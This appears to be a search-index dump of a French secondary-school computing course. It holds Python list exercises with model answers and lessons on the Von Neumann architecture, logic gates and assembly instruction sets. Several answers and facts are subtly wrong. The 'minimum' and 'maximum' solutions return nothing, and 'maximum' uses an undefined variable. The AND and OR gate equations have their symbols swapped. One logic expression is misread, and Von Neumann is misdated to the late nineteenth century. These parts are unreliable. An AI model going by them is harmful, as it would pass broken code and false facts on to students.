while.             Afficher les \u00e9l\u00e9ments du quatri\u00e8me au huiti\u00e8me en utilisant une boucle for.             Afficher les \u00e9l\u00e9ments de la liste <code>nombres</code> dans le sens inverse en utilisant une boucle while. \u2192 Voir la correction          <pre><code># Cr\u00e9ation de la liste\nnombres = [1, 2, 3, 4, 5, 6, 7, 8, 9]\n# Ou par compr\u00e9hension :\nnombres = [i for i in range(1, 10)]\n\n# 5 premiers \u00e9l\u00e9ments avec while\ni = 0\nwhile i &lt; 5:\n    print(nombres[i])\n    i += 1\n\n# \u00c9l\u00e9ments du 4\u00e8me au 8\u00e8me avec for\nfor i in range(3, 8):  # indices 3 \u00e0 7\n    print(nombres[i])\n\n# Sens inverse avec while\ni = len(nombres) - 1\nwhile i &gt;= 0:\n    print(nombres[i])\n    i -= 1</code></pre> Facile \ud83e\udd8a \ud83d\udcbb Somme d'\u00e9l\u00e9ments \u00c9crire une fonction <code>somme_elements</code> qui prend une liste de nombres en param\u00e8tres et renvoie la somme de tous les \u00e9l\u00e9ments. Exemple : somme_elements([1, 2, 3, 4]) doit renvoyer 10. \u2192 Voir la correction          <pre><code>def somme_elements(liste:list)-&gt;int:\n    somme = 0\n    for elt in liste:\n        somme = somme + elt\n    return somme</code></pre> Facile \ud83e\udd8a Compter les nombres pairs \u00c9crire une fonction <code>compter_pairs</code> qui prend une liste d'entiers et renvoie le nombre d'\u00e9l\u00e9ments pairs dans cette liste. Exemple : <pre><code>&gt;&gt;&gt; compter_pairs([1,2,3,4,5])\n2</code></pre> \u2192 Voir la correction          <pre><code>def compter_pairs(liste:list)-&gt;int:\n    nombre_pairs = 0\n    for elt in liste:\n        if elt % 2 == 0:\n            nombre_pairs = nombre_pairs + 1\n    return nombre_pairs</code></pre> Facile \ud83e\udd8a Longueur des cha\u00eenes \u00c9crire une fonction <code>longueur_chaines</code> qui prend une liste de cha\u00eenes de caract\u00e8res et renvoie une liste contenant la longueur de chaque cha\u00eene. Exemple : <pre><code>&gt;&gt;&gt; longueur_chaines([\"abc\", \"de\", \"fghi\"])\n[3, 2, 4]</code></pre> \u2192 Voir la correction          <pre><code>def longueur_chaines(liste:list)-&gt;list:\n    liste_longueurs = []\n    for elt in liste:\n        taille_elt = len(elt)\n        liste_longueurs.append(taille_elt)\n    return liste_longueurs</code></pre> Facile \ud83e\udd8a Produit d'\u00e9l\u00e9ments \u00c9crire une fonction <code>produit_elements</code> qui prend une liste d'entiers et renvoie le produit de tous les \u00e9l\u00e9ments. Attention aux cas o\u00f9 la liste est vide. Exemple : <pre><code>&gt;&gt;&gt; produit_elements([2, 3, 4])\n24\n&gt;&gt;&gt; produit_elements([])\n1</code></pre> \u2192 Voir la correction          <pre><code>def produit_elements(liste:list)-&gt;int:\n    if not liste:  # si la liste est vide\n        return 1\n    produit = 1\n    for elt in liste:\n        produit = produit * elt\n    return produit</code></pre> Facile \ud83e\udd8a Compter les occurrences \u00c9crire une fonction <code>compter_occurrences</code> qui prend une liste et un \u00e9l\u00e9ment, et renvoie le nombre de fois que cet \u00e9l\u00e9ment appara\u00eet dans la liste. Exemple : <pre><code>&gt;&gt;&gt; compter_occurrences([1, 2, 2, 3, 2], 2)\n3</code></pre> \u2192 Voir la correction          <pre><code>def compter_occurrences(liste:list, valeur: int)-&gt;int:\n    occurrences = 0\n    for elt in liste:\n        if elt == valeur:\n            occurrences = occurrences + 1\n    return occurrences</code></pre> Facile \ud83e\udd8a Calcul de moyenne \u00c9crire une fonction <code>moyenne</code> qui prend en param\u00e8tre une liste d'entiers et renvoie la moyenne de tous les nombres pr\u00e9sents dans cette liste. Exemple : <pre><code>&gt;&gt;&gt; moyenne([1, 2, 3, 4, 5])\n3.0\n&gt;&gt;&gt; moyenne([])\n0</code></pre> \u2192 Voir la correction          <pre><code>def moyenne(liste:list)-&gt;float:\n    if not liste:  # si la liste est vide\n        return 0\n    taille_liste = len(liste)\n    somme = 0\n    for elt in liste:\n        somme = somme + elt\n    return somme / taille_liste</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Filtrer les nombres positifs \u00c9crire une fonction <code>filtrer_positifs</code> qui prend une liste de nombres et renvoie une nouvelle liste contenant uniquement les nombres positifs. Exemple : <pre><code>&gt;&gt;&gt; filtrer_positifs([-1, 0, 3, -7, 8])\n[3, 8]</code></pre> \u2192 Voir la correction          <pre><code>def filtrer_positifs(liste:list)-&gt;list:\n    positifs = []\n    for elt in liste:\n        if elt &gt; 0:\n            positifs.append(elt)\n    return positifs</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Concat\u00e9ner des cha\u00eenes \u00c9crire une fonction <code>concatener_chaines</code> qui prend une liste de cha\u00eenes de caract\u00e8res et renvoie une seule cha\u00eene qui est la concat\u00e9nation de toutes les cha\u00eenes de la liste. Exemple : <pre><code>&gt;&gt;&gt; concatener_chaines([\"Bonjour\", \" \", \"le\", \" \", \"monde\"])\n\"Bonjour le monde\"</code></pre> \u2192 Voir la correction          <pre><code>def concatener_chaines(liste:list)-&gt;str:\n    concatenation = \"\"\n    for chaine in liste:\n        concatenation = concatenation + chaine\n    return concatenation</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Inverser une liste \u00c9crire une fonction <code>inverser_liste</code> qui prend une liste et renvoie une nouvelle liste avec les \u00e9l\u00e9ments dans l'ordre inverse. Exemple : <pre><code>&gt;&gt;&gt; inverser_liste([1, 2, 3])\n[3, 2, 1]</code></pre> \u2192 Voir la correction          <pre><code>def inverser_liste(liste:list)-&gt;list:\n    liste_inversee = []\n    for i in range(len(liste)-1, -1, -1):\n        liste_inversee.append(liste[i])\n    return liste_inversee</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Valeurs uniques \u00c9crire une fonction <code>valeurs_uniques</code> qui prend une liste et renvoie une nouvelle liste contenant les \u00e9l\u00e9ments sans doublons (dans l'ordre d'apparition). Exemple : <pre><code>&gt;&gt;&gt; valeurs_uniques([1, 2, 2, 3, 4, 4])\n[1, 2, 3, 4]</code></pre> \u2192 Voir la correction          <pre><code>def valeurs_uniques(liste:list)-&gt;list:\n    liste_valeurs = []\n    for elt in liste:\n        if elt not in liste_valeurs:\n            liste_valeurs.append(elt)\n    return liste_valeurs</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a S\u00e9parer pairs et impairs \u00c9crire une fonction <code>separer_pairs_impairs</code> qui prend une liste d'entiers et renvoie deux listes : une avec les \u00e9l\u00e9ments pairs et une autre avec les \u00e9l\u00e9ments impairs. Exemple : <pre><code>&gt;&gt;&gt; separer_pairs_impairs([1, 2, 3, 4, 5])\n([2, 4], [1, 3, 5])</code></pre> \u2192 Voir la correction          <pre><code>def separer_pairs_impairs(liste:list)-&gt;tuple:\n    pairs = []\n    impairs = []\n    for elt in liste:\n        if elt % 2 == 0:\n            pairs.append(elt)\n        else:\n            impairs.append(elt)\n    return pairs, impairs</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Recherche des diviseurs \u00c9crire une fonction <code>diviseurs</code> qui prend un entier en param\u00e8tre et renvoie la liste de ses diviseurs. Exemple : <pre><code>&gt;&gt;&gt; diviseurs(6)\n[1, 2, 3, 6]\n&gt;&gt;&gt; diviseurs(10)\n[1, 2, 5, 10]</code></pre> \u2192 Voir la correction          <pre><code>def diviseurs(valeur:int)-&gt;list:\n    diviseurs = []\n    for i in range(1, valeur+1):  # On commence \u00e0 1 pour \u00e9viter la division par 0\n        if valeur % i == 0:\n            diviseurs.append(i)\n    return diviseurs</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Liste croissante \u00c9crire une fonction <code>est_croissante</code> qui prend une liste d'entiers en param\u00e8tre et renvoie True si les \u00e9l\u00e9ments de la liste sont dans l'ordre croissant, False sinon. Exemple : <pre><code>&gt;&gt;&gt; est_croissante([1, 2, 3, 4])\nTrue\n&gt;&gt;&gt; est_croissante([1, 3, 2, 4])\nFalse</code></pre> \u2192 Voir la correction          <pre><code>def est_croissante(liste:list)-&gt;bool:\n    i = 0\n    while i &lt; len(liste) - 1 and liste[i] &lt;= liste[i+1]:\n        i = i + 1\n    return i == len(liste)-1</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a \u00c9change de valeurs \u00c9crire une fonction <code>echange</code> qui prend en param\u00e8tres une liste et deux indices, et \u00e9change les valeurs aux positions i et j dans la liste pass\u00e9e en param\u00e8tres. Exemple : <pre><code>&gt;&gt;&gt; liste1 = [1, 2, 3, 4]\n&gt;&gt;&gt; echange(liste1, 1, 2)\n&gt;&gt;&gt; liste1\n[1, 3, 2, 4]\n&gt;&gt;&gt; liste2 = [5, 10, 15]\n&gt;&gt;&gt; echange(liste2, 0, 2)\n&gt;&gt;&gt; liste2\n[15, 10, 5]</code></pre> \u2192 Voir la correction          <pre><code>#1\u00e8re solution : passer par une troisi\u00e8me valeur\ndef echange(liste:list, i:int, j:int)-&gt;None:\n    temp = liste[i]\n    liste[i] = liste[j]\n    liste[j] = temp</code></pre> <pre><code>#2e solution : solution Python-esque\ndef echange(liste:list, i:int, j:int)-&gt;None:\n    liste[i], liste[j] = liste[j], liste[i]</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a Rangement de valeurs \u00c9crire une fonction <code>rangement_valeurs</code> qui prend en param\u00e8tre une liste et un \u00e9l\u00e9ment, et renvoie 3 listes : une liste contenant les valeurs inf\u00e9rieures \u00e0 l'\u00e9l\u00e9ment, une liste avec l'\u00e9l\u00e9ment si pr\u00e9sent, et une liste avec les valeurs sup\u00e9rieures. Exemple : <pre><code>&gt;&gt;&gt; rangement_valeurs([1, 7, 4, 3, 6, 2, 8], 5)\n([1, 4, 3, 2], [], [7, 6, 8])\n&gt;&gt;&gt; rangement_valeurs([1, 2, 4, 3, 6, 2, 8], 2)\n([1], [2, 2], [4, 3, 6, 8])</code></pre> \u2192 Voir la correction          <pre><code>def rangement_valeurs(liste:list, valeur:int)-&gt;tuple[list, list, list]:\n    inferieures = []\n    egales = []\n    superieures = []\n    for elt in liste:\n        if elt &gt; valeur:\n            superieures.append(elt)\n        elif elt == valeur:\n            egales.append(elt)\n        else:\n            inferieures.append(elt)\n    return inferieures, egales, superieures</code></pre> Algorithme Important \ud83e\udd8a \ud83d\udd0d Recherche d'un \u00e9l\u00e9ment \u00c9crire une fonction <code>presence</code> qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : <pre><code>&gt;&gt;&gt; presence(3, [1, 2, 3, 4])\nTrue\n&gt;&gt;&gt; presence(5, [1, 2, 3, 4])\nFalse</code></pre> \u2192 Voir la correction              <pre><code>def presence(valeur: int, liste: list) -&gt; bool:\n    present = False\n    for elt in liste:\n        if elt == valeur:\n            present = True\n    return present</code></pre> Algorithme Important \ud83e\udd8a  Minimum d'une liste \u00c9crire une fonction <code>minimum</code> qui prend en param\u00e8tre une liste et renvoie la valeur minimale dans la liste. Exemple : <pre><code>&gt;&gt;&gt;  minimum([3, 1, 9, 2])\n1</code></pre> \u2192 Voir la correction              <pre><code>def minimum(liste: list) -&gt; int:\n    mini = liste[0]\n    for elt in liste:\n        if elt &lt; mini:\n            mini = elt</code></pre> Algorithme Important \ud83e\udd8a  Maximum d'une liste \u00c9crire une fonction <code>maximum</code> qui prend en param\u00e8tre une liste et renvoie la valeur maximale dans la liste. Exemple : <pre><code>&gt;&gt;&gt;  maximum([3, 1, 9, 2])\n9</code></pre> \u2192 Voir la correction              <pre><code>def maximum(liste: list) -&gt; int:\n    maxi = liste[0]\n    for elt in liste:\n        if elt &gt; mini:\n            maxi = elt</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Compteur de voyelles \u00c9crire une fonction <code>compter_voyelles</code> qui prend une liste de cha\u00eenes de caract\u00e8res et renvoie le nombre total de voyelles pr\u00e9sentes dans toutes les cha\u00eenes. Exemple : <pre><code>&gt;&gt;&gt; compter_voyelles([\"chat\", \"chien\"])\n3\n&gt;&gt;&gt; compter_voyelles([\"bonjour\", \"python\"])\n4</code></pre> \u2192 Voir la correction          <pre><code>def compter_voyelles(liste:list)-&gt;int:\n    voyelles = \"aeiouyAEIOUY\"\n    nombre_voyelles = 0\n    for mot in liste:\n        for lettre in mot:\n            if lettre in voyelles:\n                nombre_voyelles += 1\n    return nombre_voyelles</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a \u00c9l\u00e9ments en double \u00c9crire une fonction <code>valeurs_en_double</code> qui prend une liste et renvoie une nouvelle liste contenant uniquement les \u00e9l\u00e9ments qui apparaissent plus d'une fois (sans r\u00e9p\u00e9titions suppl\u00e9mentaires). Exemple : <pre><code>&gt;&gt;&gt; valeurs_en_double([1, 2, 2, 3, 4, 4, 5])\n[2, 4]\n&gt;&gt;&gt; valeurs_en_double([\"a\", \"b\", \"a\", \"c\", \"b\", \"d\"])\n[\"a\", \"b\"]</code></pre> \u2192 Voir la correction          <pre><code>def valeurs_en_double(liste:list)-&gt;list:\n    doublons = []\n    deja_vus = []\n    for elt in liste:\n        if elt in deja_vus and elt not in doublons:\n            doublons.append(elt)\n        else:\n            deja_vus.append(elt)\n    return doublons</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Recherche d'indice \u00c9crire une fonction <code>indice_element</code> qui prend une liste et un \u00e9l\u00e9ment, et renvoie l'indice de la premi\u00e8re occurrence de cet \u00e9l\u00e9ment dans la liste, ou -1 s'il n'est pas pr\u00e9sent. Exemple : <pre><code>&gt;&gt;&gt; indice_element([10, 20, 30], 20)\n1\n&gt;&gt;&gt; indice_element([10, 20, 30], 40)\n-1</code></pre> \u2192 Voir la correction          <pre><code>def indice_element(liste:list, valeur:int)-&gt;int:\n    i = 0\n    while i &lt; len(liste) and liste[i] != valeur:\n        i += 1\n    if i == len(liste):\n        return -1\n    return i</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Fusion sans doublons \u00c9crire une fonction <code>fusionner_sans_doublons</code> qui prend en param\u00e8tres deux listes et renvoie une nouvelle liste contenant tous les \u00e9l\u00e9ments des deux listes sans doublons. Exemple : <pre><code>&gt;&gt;&gt; fusionner_sans_doublons([1, 2, 3], [2, 3, 4])\n[1, 2, 3, 4]\n&gt;&gt;&gt; fusionner_sans_doublons(['a', 'b'], ['b', 'c', 'a'])\n['a', 'b', 'c']</code></pre> \u2192 Voir la correction          <pre><code>def fusionner_sans_doublons(liste1:list, liste2:list)-&gt;list:\n    resultat = []\n    # On ajoute les \u00e9l\u00e9ments de la premi\u00e8re liste\n    for elt in liste1:\n        if elt not in resultat:\n            resultat.append(elt)\n    # On ajoute les \u00e9l\u00e9ments de la deuxi\u00e8me liste\n    for elt in liste2:\n        if elt not in resultat:\n            resultat.append(elt)\n    return resultat</code></pre>"},{"location":"premiere/IV-Architecture_d_une_machine/Cours/Cours_1/","title":"Cours 1","text":"\ud83d\udcda \ud83d\udcbb Architecture d'une machine : le mod\u00e8le de Von Neumann <p>Comprendre les fondements de l'architecture informatique moderne</p> \ud83d\udcda D\u00e9finition et Histoire \ud83c\udfaf Qu'est-ce qu'un ordinateur ?              On d\u00e9finit un ordinateur comme \u00e9tant une machine qui r\u00e9alise des calculs de mani\u00e8re ordonn\u00e9e (on parlait d'ordonnateur). Il existe divers mod\u00e8les pour cr\u00e9er des machines qui r\u00e9solvent des calculs (comme la machine de Turing par exemple) mais celui qui a \u00e9t\u00e9 retenu pour r\u00e9aliser les machines que l'on utilise quotidiennement est celui de John Von Neumann.          \ud83d\udc68\u200d\ud83d\udd2c John Von Neumann                  Math\u00e9maticien de la fin du XIXe - d\u00e9but XXe si\u00e8cle dont le but \u00e9tait d'augmenter les puissances de calcul des machines d\u00e9j\u00e0 existantes \u00e0 cause notamment de la seconde guerre mondiale.              \ud83d\udda5\ufe0f Projet EDVAC                  Il reprend le mod\u00e8le de calcul du projet EDVAC qui \u00e9tait une machine de calcul militaire (qui pouvait r\u00e9aliser des op\u00e9rations math\u00e9matiques en utilisant le binaire) mais y ajoute la notion de m\u00e9moire de programme pour cr\u00e9er son mod\u00e8le.              \ud83d\udd04 Mod\u00e8le s\u00e9quentiel                  Ce mod\u00e8le r\u00e9alise des calculs de mani\u00e8re s\u00e9quentielle, ordonn\u00e9e : on peut appeler ce mod\u00e8le un mod\u00e8le de calcul s\u00e9quentiel.                       \ud83d\uddbc\ufe0f Image historique : ![edvac](edvac.jpeg)      \ud83d\udcd6 \ud83d\udd27 Les composants du mod\u00e8le de Von Neumann \ud83c\udfd7\ufe0f Architecture fondamentale              Le mod\u00e8le de Von Neumann est caract\u00e9ris\u00e9 par la pr\u00e9sence de 4 composants notables.          \ud83e\uddee UAL et UC \ud83e\udde0 Le cerveau de la machine              Les composants qui r\u00e9alisent les calculs, r\u00e9solvent les algorithmes et les ordonnent : l'Unit\u00e9 Arithm\u00e9tico Logique et l'Unit\u00e9 de Contr\u00f4le \ud83e\uddee Unit\u00e9 Arithm\u00e9tico-Logique (UAL)                  Unit\u00e9 de traitement qui sert \u00e0 r\u00e9aliser des calculs et op\u00e9rations de base. Elle peut r\u00e9aliser des op\u00e9rations math\u00e9matiques, des op\u00e9rations de logique, de comparaisons ou des d\u00e9calages. L'UAL peut aussi contenir un ensemble d'espaces de donn\u00e9es nomm\u00e9 registres.              \ud83d\udd0c Transistors                  Cette unit\u00e9 est compos\u00e9e de milliards de transistors qui sont des composants \u00e9lectroniques qui servent \u00e0 r\u00e9aliser notamment des op\u00e9rations et comparaisons suivant la logique bool\u00e9enne. Cet ensemble de transistor peut \u00eatre appel\u00e9 circuit de portes logiques ou circuit logique.              \ud83c\udf9b\ufe0f Unit\u00e9 de Contr\u00f4le (UC)                  Comme son nom l'indique, elle r\u00e9alise la gestion des flux \u00e9lectriques provenant de la m\u00e9moire ou de l'Unit\u00e9 Arithm\u00e9tico-Logique. Elle permet de r\u00e9aliser la s\u00e9quence des op\u00e9rations ; Elle est responsable de l'appellation de mod\u00e8le s\u00e9quentielle.              \ud83d\udd04 Cycle de l'Unit\u00e9 de Contr\u00f4le              Cette Unit\u00e9 de Contr\u00f4le suit un cycle pr\u00e9cis pour organiser les programmes. Il est compos\u00e9 de 4 \u00e9tapes :              1. \ud83d\udd04 Fetch : L'UC r\u00e9cup\u00e8re les instructions dans la m\u00e9moire. 2. \ud83d\udd0d Decode : L'UC d\u00e9code ces instructions en langage proche de la machine. 3. \u26a1 Execute : L'UC transmet l'instruction \u00e0 l'UAL et celle-ci lui renvoie le r\u00e9sultat. 4. \ud83d\udcbe Store : L'UC transmet le r\u00e9sultat dans la m\u00e9moire.                   \ud83d\udcbb Le Processeur : Cet ensemble d'unit\u00e9 est ce que l'on appelle le micro-processeur ou commun\u00e9ment le processeur. Il existe divers types de processeurs qui peuvent r\u00e9aliser des op\u00e9rations en \"quasi simultan\u00e9\" et qui sont cadenc\u00e9s par des signaux d'horloges : on parle de fr\u00e9quence du processeur. Cette fr\u00e9quence est en g\u00e9n\u00e9ral exprim\u00e9e en GHz (prononc\u00e9 Giga-Hertz).               \ud83d\uddbc\ufe0f Image : ![proco](intelamd.jpeg)      \ud83d\udcbe La m\u00e9moire \ud83d\udcbe Qu'est-ce que la m\u00e9moire ?              Tous les calculs, op\u00e9rations et programmes ont besoin de valeurs pour fonctionner ou doivent renvoyer et stocker des r\u00e9sultats pour les utiliser. Les machines ont aussi besoin de m\u00e9moire pour stocker de mani\u00e8re temporaire des variables de programmes ou de stockage \u00e0 long terme pour enregistrer des fichers par exemple.                          Il existe divers types de m\u00e9moire qui permettent le bon fonctionnement d'une machine.          \u26a1 Cache du processeur                  Le cache du processeur est une m\u00e9moire d'acc\u00e8s tr\u00e8s rapide, situ\u00e9e entre le processeur et la RAM. Elle permet de stocker temporairement les instructions utilis\u00e9es par le processeur pour \u00e9viter de tout le temps les calculer. Cela permet d'optimiser l'utilisation du processeur.              \ud83d\udd04 M\u00e9moire volatile (RAM)                  La m\u00e9moire volatile ou m\u00e9moire RAM (Random Access Memory) correspond \u00e0 la m\u00e9moire court terme de la machine. Cette m\u00e9moire n'est pas aussi cons\u00e9quente qu'une m\u00e9moire de stockage mais poss\u00e8de des fr\u00e9quences d'acc\u00e8s tr\u00e8s rapides (de l'ordre du GHz).                                  Cette m\u00e9moire permet de stocker temporairement les donn\u00e9es \u00e0 des programmes en cours d'ex\u00e9cution. Le fait de stocker ces donn\u00e9es dans la RAM permet au processeur d'acc\u00e9der \u00e0 des donn\u00e9es tr\u00e8s rapidement.              \ud83d\udcc0 M\u00e9moire morte (ROM)                  La m\u00e9moire ROM (ou Read-Only Memory) est une m\u00e9moire qui est non-volatile. Elle est conserv\u00e9e m\u00eame lorsque la machine est \u00e9teinte. Elle contient les instructions n\u00e9cessaires au d\u00e9marrage de l'ordinateur (BIOS ou firmware).              \ud83d\udcbf M\u00e9moire \u00e0 long terme                  La m\u00e9moire \u00e0 long terme permet de stocker des donn\u00e9es et des fichiers. Elle est celle qui correspond aux disques durs, clefs USB ou SSD. Elle permet de stocker le syst\u00e8me d'exploitation, les applications ou les donn\u00e9es (fichiers, programmes etc...).              \ud83d\udd0c Les bus et p\u00e9riph\u00e9riques \ud83d\udd0c Les bus              Les bus sont des ensembles de fils \u00e9lectriques qui permettent de faire circuler l'information entre les diff\u00e9rents composants de l'ordinateur.          \ud83d\udcca Bus de donn\u00e9es                  Transporte les donn\u00e9es entre les composants              \ud83d\udccd Bus d'adresses                  Indique o\u00f9 les donn\u00e9es doivent \u00eatre lues ou \u00e9crites              \ud83c\udf9b\ufe0f Bus de contr\u00f4le                  Transporte les signaux de contr\u00f4le (lecture, \u00e9criture, etc.)              \ud83d\udda5\ufe0f Les p\u00e9riph\u00e9riques              Les p\u00e9riph\u00e9riques sont des composants externes qui permettent d'interagir avec l'ordinateur :          \u2328\ufe0f P\u00e9riph\u00e9riques d'entr\u00e9e                  Clavier, souris, microphone, cam\u00e9ra              \ud83d\udda8\ufe0f P\u00e9riph\u00e9riques de sortie                  \u00c9cran, imprimante, haut-parleurs              \ud83d\udcf1 P\u00e9riph\u00e9riques d'entr\u00e9e/sortie                  \u00c9cran tactile, disque dur externe                       \ud83d\uddbc\ufe0f Image : ![bus](bus.png)      \u26a0\ufe0f La limite du mod\u00e8le de Von Neumann \u26a0\ufe0f Probl\u00e8me principal              Ce mod\u00e8le est un mod\u00e8le efficace et qui a fait ses preuves depuis les ann\u00e9es 70. Cependant il souffre d'un gros probl\u00e8me : la communication entre les divers composants.                          Les composants ont tous des fr\u00e9quences de fonctionnement ou des d\u00e9bits diff\u00e9rents. Le mod\u00e8le de Von Neumann est confront\u00e9 \u00e0 un probl\u00e8me de goulots d'\u00e9tranglements (ou connu sous le nom de bottleneck en anglais).          \ud83d\udeb0 Analogie de la plomberie                  On peut imager cela comme un syst\u00e8me de plomberie. Imaginons en entr\u00e9e un tube de 100mm de diam\u00e8tre qui est aliment\u00e9 de mani\u00e8re compl\u00e8te. Si celui-ci est suivi d'un tube de 40mm, cette portion va ralentir le debit global.                                  Cela fonctionne pareil avec un ordinateur : si la m\u00e9moire fonctionne \u00e0 une fr\u00e9quence de 1 GHZ, le processeur \u00e0 1 GHz mais que les bus ne transmettent qu'\u00e0 une fr\u00e9quence de 20 MHz, l'ensemble de la machine sera ralenti.              \ud83c\udfae Exemple concret : Gaming PC Pour ceux qui jouent sur PC :                  Il peut arriver qu'il y ait un bottleneck entre le processeur et la carte graphique. Si l'un des deux composants est trop faible compar\u00e9 \u00e0 l'autre, il peut ralentir de mani\u00e8re globale les performances en jeu."},{"location":"premiere/IV-Architecture_d_une_machine/Cours/Cours_2/","title":"Cours 2","text":"\ud83d\udcda Les circuits \u00e9lectroniques <p>Chapitre IV - Architecture d'une machine</p> \ud83d\udcd6 D\u00e9finitions \u26a1 Circuits logiques              Les circuits logiques sont des \u00e9l\u00e9ments fondamentaux de l'informatique, qui permettent de traiter l'information de mani\u00e8re num\u00e9rique. Ils sont utilis\u00e9s dans une multitude d'applications, allant des ordinateurs et des t\u00e9l\u00e9phones portables aux dispositifs de contr\u00f4le de la circulation et des syst\u00e8mes de s\u00e9curit\u00e9.          \ud83d\udd0c Transistors                  Dispositifs \u00e9lectroniques qui permettent de contr\u00f4ler le flux de courant \u00e9lectrique. Ils peuvent \u00eatre utilis\u00e9s pour amplifier un signal ou pour activer ou d\u00e9sactiver un circuit.              \ud83d\udeaa Portes logiques                  Circuits \u00e9lectroniques qui effectuent des op\u00e9rations logiques de base, telles que la conjonction, la disjonction, l'inversion, etc. Elles sont construites \u00e0 partir de transistors.              \ud83c\udfd7\ufe0f Circuits complexes                  Les portes logiques peuvent \u00eatre combin\u00e9es pour former des circuits logiques plus complexes qui r\u00e9alisent des fonctions avanc\u00e9es.                       \ud83d\uddbc\ufe0f Image : ![transistor](transistor.png)      \ud83d\udcd6 Les portes logiques \ud83d\udeaa D\u00e9finition              Une porte logique est un composant \u00e9lectronique qui effectue une op\u00e9ration logique sur un ou plusieurs signaux d'entr\u00e9e pour produire un signal de sortie. Les portes logiques sont les briques de base des circuits logiques, et sont utilis\u00e9es pour construire des circuits plus complexes.                   \ud83d\udcca Table de v\u00e9rit\u00e9 : On peut associer \u00e0 une porte logique une table de v\u00e9rit\u00e9. Elle retranscrit les r\u00e9sultats de l'op\u00e9ration suivant chaque combinaison possible des variables d'entr\u00e9e.      \ud83d\udeab Porte NOT              Cette porte logique produit un signal de sortie qui est l'inverse du signal d'entr\u00e9e. Si le signal d'entr\u00e9e est \"1\", le signal de sortie est \"0\", et vice versa. \u00c9quation : $S = \\overline{A}$          Entr\u00e9eSortie 01 10              \ud83d\uddbc\ufe0f ![rprnot](repr_not.png)          \ud83d\udd17 Porte AND              Cette porte logique produit un signal de sortie \"1\" uniquement si tous les signaux d'entr\u00e9e sont \"1\". Sinon, le signal de sortie est \"0\". \u00c9quation : $S = A \\vee B$ ou $S = A \\times B$          ABSortie 000 010 100 111              \ud83d\uddbc\ufe0f ![rprand](repr_and.png)          \u2795 Porte OR              Cette porte logique produit un signal de sortie \"1\" si l'un des signaux d'entr\u00e9e est \"1\" ou si les deux signaux d'entr\u00e9e sont \"1\". Si tous les signaux d'entr\u00e9e sont \"0\", le signal de sortie est \"0\". \u00c9quation : $S = A \\wedge B$ ou $S = A + B$          ABSortie 000 011 101 111              \ud83d\uddbc\ufe0f ![rpror](repr_or.png)          \u26a1 Porte XOR              Cette porte logique produit un signal de sortie \"1\" si un seul des signaux d'entr\u00e9e est \"1\". Si tous les signaux d'entr\u00e9e sont \"0\" ou \"1\", le signal de sortie est \"0\". \u00c9quation : $S = \\overline{A}B + A \\overline{B}$ ou $A \\oplus B$          ABSortie 000 011 101 110              \ud83d\uddbc\ufe0f ![rprxor](repr_xor.png)"},{"location":"premiere/IV-Architecture_d_une_machine/Cours/Cours_2/#les-equations-logiques","title":"\ud83d\udcd6 Les \u00e9quations logiques","text":"<p>Une \u00e9quation logique est une expression alg\u00e9brique qui repr\u00e9sente une fonction logique en utilisant des variables logiques, des op\u00e9rateurs logiques et des constantes logiques. L'\u00e9quation logique permet de d\u00e9crire le comportement d'un circuit logique ou d'une fonction logique de mani\u00e8re formelle. Les \u00e9quations logiques suivent des r\u00e8gles de priorit\u00e9 d'op\u00e9rations similaires \u00e0 PEMDAS. Par exemple, une \u00e9quation logique simple pourrait \u00eatre \\(S = A \\vee B \\oplus C\\). Elle se lit \"A et B ou C\".</p>"},{"location":"premiere/IV-Architecture_d_une_machine/Cours/Cours_3/","title":"Cours 3","text":"\ud83d\udcda Jeux d'instruction <p>Chapitre IV - Architecture d'une machine</p> \ud83d\udcd6 D\u00e9finitions \ud83c\udfaf Jeu d'instruction              Un jeu d'instruction correspond \u00e0 l'ensemble des op\u00e9rations r\u00e9alisables et c\u00e2bl\u00e9es pour un processeur donn\u00e9.          \ud83d\udd22 Binaire                  Les processeurs, par leur composition ne comprennent que le binaire mais le syst\u00e8me d'exploitation permet de traduire les langages de programmation en op\u00e9rations compr\u00e9hensibles par le processeur.              \ud83c\udff7\ufe0f Mn\u00e9monique                  On appelle mn\u00e9monique une instruction compr\u00e9hensible par le processeur. Suivant le processeur, il existe divers mn\u00e9moniques.              \u2699\ufe0f Assembleur                  Il existe un langage de programmation proche du processeur et compr\u00e9hensible par l'\u00eatre humain : l'assembleur.                       \ud83d\udd27 Types d'op\u00e9rations : Il existe diverses op\u00e9rations, comme en python, que l'on peut distinguer :      \ud83d\udcbe Op\u00e9rations Registres STR X, Val : Stocke la valeur Val dans le registre X. MOV A B : D\u00e9place les valeurs d'un registre A \u00e0 un autre B.          \ud83e\uddee Op\u00e9rations Math\u00e9matiques ADD X Y : Ajouter deux valeurs. SUB X Y : Soustraire un op\u00e9rande d'un autre. MUL X Y : Multiplier deux valeurs. DIV X Y : Diviser un op\u00e9rande par un autre.          \ud83d\udd17 Op\u00e9rations Bool\u00e9ennes AND : Effectuer une op\u00e9ration logique AND entre deux valeurs. OR : Effectuer une op\u00e9ration logique OR entre deux valeurs. XOR : Effectuer une op\u00e9ration logique XOR entre deux valeurs.          \ud83d\udd04 Boucles et Conditions              Pour les boucles, on saute \u00e0 une certaine \u00e9tape indiqu\u00e9e dans le code du programme apr\u00e8s une comparaison. Pour les conditions, l'endroit du saut correspond au r\u00e9sultat que l'on souhaite. On d\u00e9clare ce que l'on appelle des ancres.          \ud83d\udd0d CMP A B              Comparer deux valeurs.          \u2696\ufe0f JE              Sauter \u00e0 une autre instruction si les valeurs sont \u00e9gales (Jump if Equal).          \u274c JNE              Sauter \u00e0 une autre instruction si les valeurs ne sont pas \u00e9gales (Jump if Not Equal).          